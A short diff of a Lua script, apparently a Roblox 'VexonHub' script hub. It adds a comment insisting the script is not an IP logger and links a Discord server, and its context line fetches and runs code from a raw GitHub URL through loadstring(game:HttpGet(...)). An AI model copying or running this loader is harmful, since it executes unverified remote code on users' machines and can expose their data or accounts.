@@ -45,4 +45,7 @@ else
     })
 end
 
+
+-- This Is For VexonHub Users Server Its Not Ip Logger Here If You Want To Join
+-- https://discord.gg/Eu9Kcv6V
 loadstring(game:HttpGet("https://raw.githubusercontent.com/DiosDi/VexonHub/refs/heads/main/Users-VexonHub"))()
